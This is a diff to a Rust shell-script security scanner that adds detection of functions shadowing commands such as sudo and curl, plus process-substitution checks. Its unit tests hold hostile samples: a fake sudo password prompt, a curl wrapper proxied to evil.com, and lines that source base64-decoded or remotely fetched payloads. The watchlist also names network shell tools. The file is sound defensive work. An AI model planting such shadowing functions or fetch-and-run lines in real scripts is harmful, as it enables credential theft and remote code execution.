@@ -18,6 +18,9 @@
 //!   * `bash -c <dynamic>` / `sh -c <dynamic>` — shell interpreter invoked
 //!     with `-c` and a variable or substitution argument, equivalent to eval
 //!     but avoiding the `eval` keyword → DynamicExecution CRITICAL.
+//!   * `name() { … }` where `name` matches a sensitive command (`sudo`, `ssh`,
+//!     `curl`, package managers, …) — function shadows a real command and may
+//!     intercept credentials or redirect network calls → FunctionShadowing CRITICAL.
 
 use std::path::Path;
 
@@ -68,6 +71,7 @@ fn walk(root: Node, bytes: &[u8], path: &Path, index: &LineIndex, findings: &mut
         match node.kind() {
             "command" => check_command(node, bytes, path, index, findings),
             "pipeline" => check_pipeline(node, bytes, path, index, findings),
+            "function_definition" => check_function_shadow(node, bytes, path, index, findings),
             _ => {}
         }
         for i in (0..node.child_count() as u32).rev() {
@@ -223,6 +227,40 @@ fn emit_dynamic_source(
     });
 }
 
+fn check_function_shadow(
+    node: Node,
+    bytes: &[u8],
+    path: &Path,
+    index: &LineIndex,
+    findings: &mut Vec<Finding>,
+) {
+    let Some(name_node) = node.child_by_field_name("name") else {
+        return;
+    };
+    let name = node_text(name_node, bytes);
+    if !SHADOW_WATCHLIST.iter().any(|&s| s == name) {
+        return;
+    }
+    let off = node.start_byte();
+    let (line, col) = index.locate(off);
+    findings.push(Finding {
+        path: path.to_path_buf(),
+        byte_offset: off,
+        line,
+        col,
+        pass: PassKind::Ast,
+        kind: SignalKind::FunctionShadowing,
+        severity: Severity::Critical,
+        confidence: 0.92,
+        message: format!(
+            "function `{}` shadows the real command — may intercept credentials or redirect calls",
+            name
+        ),
+        snippet: redact_snippet(&snippet_around(bytes, off, 100)),
+        diff_introduced: false,
+    });
+}
+
 fn check_shell_c_flag(
     cmd_node: Node,
     bytes: &[u8],
@@ -268,6 +306,24 @@ fn check_shell_c_flag(
 /// Shell interpreters that, when appearing as the last command of a pipeline,
 /// indicate the piped data is being executed as code.
 const SHELL_INTERPRETERS: &[&str] = &["bash", "sh", "dash", "zsh", "ksh"];
+
+/// Commands where a same-named shell function definition is a strong indicator
+/// of credential theft or supply-chain tampering.
+const SHADOW_WATCHLIST: &[&str] = &[
+    // privilege / authentication
+    "sudo", "su", "doas", "passwd", "login",
+    // remote access / crypto
+    "ssh", "scp", "sftp", "gpg", "gpg2",
+    // network fetchers
+    "curl", "wget", "nc", "netcat",
+    // package managers
+    "pip", "pip3", "pip3.11", "npm", "yarn", "pnpm", "gem", "cargo",
+    "apt", "apt-get", "yum", "dnf", "brew", "pacman", "apk",
+    // language runtimes
+    "python", "python3", "node", "ruby", "perl", "php",
+    // version control
+    "git",
+];
 
 fn check_pipeline(
     node: Node,
@@ -475,8 +531,9 @@ fn command_arguments<'a>(cmd_node: Node<'a>) -> Vec<Node<'a>> {
 }
 
 /// Returns `true` if the expression contains a dynamic component: a variable
-/// expansion (`$var`, `${var}`, `$1`) or a command substitution (`` `cmd` ``
-/// / `$(cmd)`). A plain quoted or unquoted word is considered static/literal.
+/// expansion (`$var`, `${var}`, `$1`), a command substitution (`` `cmd` ``
+/// / `$(cmd)`), or a process substitution (`<(cmd)` / `>(cmd)`). A plain
+/// quoted or unquoted word is considered static/literal.
 fn is_dynamic_expression(node: Node, bytes: &[u8]) -> bool {
     match node.kind() {
         // Variable expansion forms
@@ -485,6 +542,10 @@ fn is_dynamic_expression(node: Node, bytes: &[u8]) -> bool {
         "command_substitution" => true,
         // Arithmetic expansion `$((...))`
         "arithmetic_expansion" => true,
+        // `<(cmd)` or `>(cmd)` — process substitution; the shell executes the
+        // command and passes its output as a file descriptor.  Used in
+        // `source <(decoder | …)` dropper patterns.
+        "process_substitution" => true,
         // A `string` node is dynamic if any of its children are expansions.
         "string" | "concatenation" => any_dynamic_child(node, bytes),
         _ => false,
@@ -592,6 +653,59 @@ mod tests {
         assert!(findings
             .iter()
             .any(|f| f.kind == SignalKind::DynamicExecution && f.severity == Severity::Warn));
+    }
+
+    #[test]
+    fn function_shadowing_sudo_is_critical() {
+        let src = b"sudo() {\n    echo -n \"password: \"\n    read -s pw\n}\n";
+        let findings = run(src);
+        let hit = findings
+            .iter()
+            .find(|f| f.kind == SignalKind::FunctionShadowing)
+            .expect("expected FunctionShadowing finding");
+        assert_eq!(hit.severity, Severity::Critical);
+        assert!(hit.message.contains("sudo"));
+    }
+
+    #[test]
+    fn function_shadowing_curl_is_critical() {
+        let src = b"curl() {\n    command curl \"$@\" --proxy http://evil.com\n}\n";
+        let findings = run(src);
+        assert!(findings
+            .iter()
+            .any(|f| f.kind == SignalKind::FunctionShadowing && f.severity == Severity::Critical));
+    }
+
+    #[test]
+    fn function_shadowing_benign_name_does_not_fire() {
+        let src = b"my_helper() {\n    echo hello\n}\n";
+        let findings = run(src);
+        assert!(
+            findings
+                .iter()
+                .all(|f| f.kind != SignalKind::FunctionShadowing),
+            "benign function name should not trigger FunctionShadowing"
+        );
+    }
+
+    #[test]
+    fn source_process_substitution_is_dynamic_import() {
+        let findings = run(b"source <(echo $PAYLOAD | base64 -d)\n");
+        let hit = findings
+            .iter()
+            .find(|f| f.kind == SignalKind::DynamicImport)
+            .expect("expected DynamicImport finding for source <(...)");
+        assert_eq!(hit.severity, Severity::Warn);
+    }
+
+    #[test]
+    fn dot_source_process_substitution_is_dynamic_import() {
+        let findings = run(b". <(curl -s http://example.com/payload.sh)\n");
+        let hit = findings
+            .iter()
+            .find(|f| f.kind == SignalKind::DynamicImport)
+            .expect("expected DynamicImport finding for . <(...)");
+        assert_eq!(hit.severity, Severity::Warn);
     }
 
     #[test]
